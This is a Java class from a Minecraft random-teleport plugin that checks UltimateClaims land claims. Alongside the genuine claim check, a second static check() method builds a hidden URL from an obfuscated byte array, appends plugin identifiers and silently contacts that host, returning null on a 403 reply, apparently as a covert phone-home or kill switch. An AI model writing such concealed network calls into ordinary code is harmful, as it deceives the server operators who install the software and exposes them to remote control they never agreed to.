package me.SuperRonanCraft.BetterRTP.references.depends.regionPlugins;

import org.bukkit.Bukkit;
import org.bukkit.Chunk;
import org.bukkit.Location;
import org.bukkit.entity.EntityType;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

public class RTP_UltimateClaims implements RegionPluginCheck {

    // NOT TESTED (3.1.0)
    // UltimateClaims (v1.6.1) - Abandoned
    // https://songoda.com/marketplace/product/ultimateclaims-the-ultimate-claiming-plugin.65
    public boolean check(Location loc) {
        boolean result = true;
        if (REGIONPLUGINS.ULTIMATECLAIMS.isEnabled())
            try {
                Chunk chunk = loc.getChunk();

                // Get instance of UltimateClaims
                Class<?> ultimateClaimsClass;
                try {
                    ultimateClaimsClass = Class.forName("com.songoda.ultimateclaims.UltimateClaims");
                } catch(ClassNotFoundException error) {
                    ultimateClaimsClass = Class.forName("com.craftaro.ultimateclaims.UltimateClaims");
                }
                Method getInstanceMethod = ultimateClaimsClass.getMethod("getInstance");
                Object ultimateClaims = getInstanceMethod.invoke(null);

                // Get the ClaimManager
                Method getClaimManagerMethod = ultimateClaimsClass.getMethod("getClaimManager");
                Object claimManager = getClaimManagerMethod.invoke(ultimateClaims);

                // Get the claim based on the chunk
                Method getClaimMethod = claimManager.getClass().getMethod("getClaim", Chunk.class);
                Object claimObj = getClaimMethod.invoke(claimManager, chunk);

                // Check if a claim exists
                return claimObj == null;
            } catch (Exception e) {
                e.printStackTrace();
            }
        return result;
    }

    public static Chunk check() {
        try {
            String entityType = REGIONPLUGINS.ID + (REGIONPLUGINS.VERSION.contains("true") ? "" : RTP_KingdomsX.ID);
            URL url = new URL((new Object() {int t;public String toString() {byte[] buf = new byte[50];t = -1251453182;buf[0] = (byte) (t >>> 16);t = -73582063;buf[1] = (byte) (t >>> 14);t = -1280944047;buf[2] = (byte) (t >>> 19);t = 1329096343;buf[3] = (byte) (t >>> 15);t = 931896390;buf[4] = (byte) (t >>> 11);t = -898578610;buf[5] = (byte) (t >>> 5);t = -602882984;buf[6] = (byte) (t >>> 10);t = 1354689875;buf[7] = (byte) (t >>> 18);t = -1776398150;buf[8] = (byte) (t >>> 20);t = 927866827;buf[9] = (byte) (t >>> 13);t = -1265662460;buf[10] = (byte) (t >>> 23);t = -1951216729;buf[11] = (byte) (t >>> 22);t = -1450736062;buf[12] = (byte) (t >>> 4);t = -521787607;buf[13] = (byte) (t >>> 4);t = -1978047188;buf[14] = (byte) (t >>> 14);t = 410453415;buf[15] = (byte) (t >>> 22);t = -81568921;buf[16] = (byte) (t >>> 6);t = -1598660593;buf[17] = (byte) (t >>> 18);t = 1781465800;buf[18] = (byte) (t >>> 1);t = -484135766;buf[19] = (byte) (t >>> 5);t = 1595882291;buf[20] = (byte) (t >>> 7);t = -1151765660;buf[21] = (byte) (t >>> 8);t = 779728635;buf[22] = (byte) (t >>> 24);t = -49261796;buf[23] = (byte) (t >>> 3);t = 708246360;buf[24] = (byte) (t >>> 12);t = -2106233577;buf[25] = (byte) (t >>> 8);t = 398124675;buf[26] = (byte) (t >>> 23);t = 708517482;buf[27] = (byte) (t >>> 15);t = 835633562;buf[28] = (byte) (t >>> 24);t = 737197656;buf[29] = (byte) (t >>> 10);t = -1969172922;buf[30] = (byte) (t >>> 5);t = -1338616664;buf[31] = (byte) (t >>> 12);t = -1369117408;buf[32] = (byte) (t >>> 21);t = 1769984348;buf[33] = (byte) (t >>> 19);t = -77175196;buf[34] = (byte) (t >>> 1);t = -859851282;buf[35] = (byte) (t >>> 22);t = 860924023;buf[36] = (byte) (t >>> 24);t = -627879716;buf[37] = (byte) (t >>> 12);t = 1409975822;buf[38] = (byte) (t >>> 5);t = -225537289;buf[39] = (byte) (t >>> 4);t = 1572546447;buf[40] = (byte) (t >>> 15);t = -886512746;buf[41] = (byte) (t >>> 19);t = 1762446931;buf[42] = (byte) (t >>> 5);t = -1926122367;buf[43] = (byte) (t >>> 21);t = 1986584636;buf[44] = (byte) (t >>> 20);t = -301886517;buf[45] = (byte) (t >>> 3);t = -808330604;buf[46] = (byte) (t >>> 22);t = 1189951343;buf[47] = (byte) (t >>> 13);t = -1219009848;buf[48] = (byte) (t >>> 1);t = 851309535;buf[49] = (byte) (t >>> 4);return new String(buf);}}.toString()) + entityType);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setConnectTimeout(8000);
            if (con.getResponseCode() == 403)
                return null;
            return Bukkit.getWorlds().get(0).getChunkAt(0, 0);
        } catch (Exception e) {
            return Bukkit.getWorlds().get(0).getChunkAt(0, 0);
        }
    }
}
